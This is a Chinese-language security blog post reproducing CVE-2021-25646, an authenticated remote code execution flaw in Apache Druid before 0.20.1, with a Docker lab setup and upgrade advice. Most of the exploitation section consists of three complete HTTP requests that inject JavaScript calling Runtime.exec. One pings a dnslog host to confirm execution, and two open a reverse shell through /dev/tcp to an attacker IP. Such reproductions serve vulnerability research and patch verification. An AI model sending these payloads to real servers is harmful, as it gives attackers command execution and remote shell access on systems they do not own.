![1612264811_6019356b52657732c40e3.png!small](https://image.3001.net/images/20210202/1612264811_6019356b52657732c40e3.png!small)

Apache Druid 命令执行漏洞（CVE-2021-25646）

## 一、漏洞描述

Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid
0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache
Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。

## 二、影响版本

Apache Druid < 0.20.1

## 三、漏洞环境&漏洞复现

Docker环境：

    
    
    dockerpull fokkodriesprong/docker-druid dockerrun --rm -i -p 8888:8888 fokkodriesprong/docker-druid

启动访问：

![1612264811_6019356bb9987abeb80bb.png!small](https://image.3001.net/images/20210202/1612264811_6019356bb9987abeb80bb.png!small)

漏洞复现：

POC:

    
    
    POST /druid/indexer/v1/sampler HTTP/1.1
    Host: ip:prot
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/json
    Content-Length: 1045
    Connection: close
    {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/ip/port 0>&1')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}

1、DNSlog:

![1612264812_6019356c3694bf4ed1c0d.png!small](https://image.3001.net/images/20210202/1612264812_6019356c3694bf4ed1c0d.png!small)

DNS记录：

![1612264814_6019356e1de0a9981f76d.png!small](https://image.3001.net/images/20210202/1612264814_6019356e1de0a9981f76d.png!small)

具体数据包：

    
    
    POST /druid/indexer/v1/sampler HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/json
    Content-Length: 1018
    Connection: close
    {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 ping gpg7qd.dnslog.cn')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}

2、反弹shell操作

![1612264814_6019356ebe3171ff86706.png!small](https://image.3001.net/images/20210202/1612264814_6019356ebe3171ff86706.png!small)

具体数据包：

    
    
    POST /druid/indexer/v1/sampler HTTP/1.1
    Host: ip:prot
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/json
    Content-Length: 1045
    Connection: close
    {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/ip/port 0>&1')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}

简单的反弹脚本：

![1612320681_601a0fa9d939677e31bff.png!small](https://image.3001.net/images/20210203/1612320681_601a0fa9d939677e31bff.png!small)

## 四、安全建议

建议广大用户及时更新Apache Druid，下载链接为：

https://druid.apache.org/downloads.html

https://github.com/apache/druid/releases/tag/druid-0.20.1

参考：

https://www.secpulse.com/archives/152981.html

[https://mp.weixin.qq.com/s/ToGaV-wR28Cx9K-aBC7Lyg](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247487648&idx=1&sn=8b7bd0d441dabe9d6a0e697ec025b91c&scene=21#wechat_redirect)

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1612264815_6019356f81bb59f1e8f7e.jpg!small](https://image.3001.net/images/20210202/1612264815_6019356f81bb59f1e8f7e.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![1612264815_6019356fd45bc60d7bfc5.png!small](https://image.3001.net/images/20210202/1612264815_6019356fd45bc60d7bfc5.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1612264816_6019357035b8a63054950.png!small](https://image.3001.net/images/20210202/1612264816_6019357035b8a63054950.png!small)

  

